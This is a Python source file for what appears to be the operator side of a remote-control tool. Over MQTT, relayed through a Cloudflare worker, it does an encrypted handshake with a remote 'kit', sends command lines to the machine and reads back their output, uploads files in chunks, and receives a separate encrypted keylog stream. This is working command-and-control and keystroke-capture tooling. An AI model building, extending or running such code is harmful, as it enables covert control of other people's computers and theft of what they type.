"""
mqtt client lol

im so fucking tired ill explain how it works soon

this talks to the cloudflare worker, which then talks to the machine thru mqtt by proxy

read readme on full detail this might be a bit overwhelming
"""
import asyncio
import os
import queue
import struct
import time

import paho.mqtt.client as mqtt
import pysodium
from hashlib import sha512


# MAGIC BYTES 
HELLO = int(0xDEFACED).to_bytes(8, "big")
RESP = int(0xDEFACDE).to_bytes(8, "big")
ACK = bytes.fromhex("acedacedacedaced")
FILE_ACK = bytes.fromhex("facefacefaceface")

# FRESHLY GENERATED
# this is the fallback key prob dont use  this
PUBBACKUP = bytes.fromhex("e4353550c44b1c499f46f39454fb703f67265a75899a52f8d04328300dfb7e5e")
TS_WINDOW = 1800


def secret_nonce(tag, ctr):
	return bytes([tag]) + b"\0" * 7 + (ctr).to_bytes(8, "little") + b"\0" * 8


# magic[8] ts[8] nonce[16] n_o[16] epubkey[32] buf[40]
# ^^^ pkt layoiut
RESP_LEN = 120

def handshake(hello, kit_pub):
	if hello[:8] != HELLO:
		raise ValueError("bad hello")
	
	n_r = hello[8:32]

	epub, epriv = pysodium.crypto_box_keypair()
	key = pysodium.crypto_box_beforenm(kit_pub, epriv)

	ts = int(time.time()).to_bytes(8, "little")

	n_o = os.urandom(16)

	ct = pysodium.crypto_box_afternm(ts + n_o, n_r, key)
	resp = RESP
	resp += ts 
	resp += n_r[:16]
	resp += n_o 
	resp += epub 
	resp += ct
	assert len(resp) == RESP_LEN
	keys = sha512(key + epub).digest()
	return resp, keys[32:], keys[:32]


class Session:
	def __init__(self, mid, kit_pub=None, on_output=None):
		# SET UP CF WORKER PLEASE.
		worker = os.environ.get("MQTT_WORKER", "")
		token = os.environ.get("MQTT_TOKEN", "")
		if not worker:
			raise OSError("MQTT_WORKER not configured")

		self.base = mid
		self.kit_pub = bytes.fromhex(kit_pub) if kit_pub else PUBBACKUP
		self.txctr = 1
		self.rxctr = 1
		self.krxctr = 1
		self.file_txctr = 1
		self.last_seen = time.time()
		self.alive = True
		self.handshakes = queue.Queue(maxsize=1)
		self.acks = queue.Queue(maxsize=1)
		self.file_acks = queue.Queue(maxsize=1)
		self.outputs = queue.Queue()
		self.on_output = on_output
		self.on_keylog = None

		self.mqtt = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, transport="websockets", client_id=f"{mid}o{os.urandom(2).hex()}")
		self.mqtt.ws_set_options(path=f"/?t={token}" if token else "/")

		# plain ws vs bare host on wss 443.
		host, _, port = worker.partition(":")
		if not port:
			self.mqtt.tls_set()
			port = "443"
		
		self.mqtt.on_connect = self.onconnect
		self.mqtt.on_message = self.onmsg
		self.mqtt.connect(host, int(port), keepalive=60)
		self.mqtt.loop_start()

		try:
			resp, self.tx_key, self.rx_key = self.handshakes.get(timeout=45)
		except queue.Empty:
			self.close()
			raise OSError("bro the fuck")
		self.mqtt.publish(f"{self.base}/hr", resp, qos=1)
		try:
			self.acks.get(timeout=10)
		except queue.Empty:
			self.close()
			raise OSError("handshake ack timeout")

	def onconnect(self, client, userdata, flags, rc, props):
		client.subscribe([(f"{self.base}/h", 1), (f"{self.base}/u", 1), (f"{self.base}/k", 1)])

	def onmsg(self, client, userdata, msg):
		if msg.retain:
			return
		self.last_seen = time.time()
		if msg.topic.endswith("/h") and msg.payload[:8] == HELLO:
			try:
				self.handshakes.put_nowait(handshake(msg.payload, self.kit_pub))
			except queue.Full:
				pass
		elif msg.topic.endswith("/h") and msg.payload[:8] == ACK:
			try:
				self.acks.put_nowait(msg.payload[8:32])
			except queue.Full:
				pass
		elif msg.topic.endswith("/h") and msg.payload[:8] == FILE_ACK:
			try:
				self.file_acks.put_nowait(True)
			except queue.Full:
				pass
		elif msg.topic.endswith("/k"):
			try:
				out = pysodium.crypto_secretbox_open(
					msg.payload, secret_nonce(0x05, self.krxctr), self.rx_key)
				self.krxctr += 1
			except Exception:
				return
			if self.on_keylog:
				self.on_keylog(out)
		elif msg.topic.endswith("/u"):
			try:
				out = pysodium.crypto_secretbox_open(
					msg.payload, secret_nonce(0x02, self.rxctr), self.rx_key)
				self.rxctr += 1
			except Exception:
				return
			self.outputs.put(out)
			if self.on_output:
				self.on_output(out)

	# with some delimiter
	def fileframe(self, op, body=b""):
		pkt = pysodium.crypto_secretbox(
			bytes([op]) + body,
			secret_nonce(0x04, self.file_txctr),
			self.tx_key)
		self.file_txctr += 1
		self.mqtt.publish(f"{self.base}/f", pkt, qos=0)

	async def upload(self, path, data, on_progress=None, chunk=2048, delay=0.002):
		pathb = os.fsencode(path)
		self.fileframe(0, struct.pack("<IH", len(data), len(pathb)) + pathb)
		done = 0
		for off in range(0, len(data), chunk):
			part = data[off:off+chunk]
			self.fileframe(1, struct.pack("<I", off) + part)
			done += len(part)
			if on_progress:
				await on_progress(done, len(data))
			await asyncio.sleep(delay)
		self.fileframe(2)
		try:
			self.file_acks.get(timeout=30)
		except queue.Empty:
			raise OSError("file ack timeout")

	# specal frame to indicate end of transfer 
	def finish_upload(self):
		self.fileframe(3)

	def send(self, line, timeout=120):
		return self.blastone(line, timeout)

	def blastone(self, line, timeout):
		pkt = pysodium.crypto_secretbox(
			line.encode(), secret_nonce(0x01, self.txctr), self.tx_key)
		self.txctr += 1
		self.mqtt.publish(f"{self.base}/d", pkt, qos=1)
		data = b""
		try:
			while True:
				chunk = self.outputs.get(timeout=timeout)
				data += chunk[1:]
				if chunk[0] == 0:
					break
		except queue.Empty:
			while True:
				try:
					self.outputs.get_nowait()
				except queue.Empty:
					break
			return b"(timeout)"
		return data


	def close(self):
		self.alive = False
		self.mqtt.disconnect()
		self.mqtt.loop_stop()
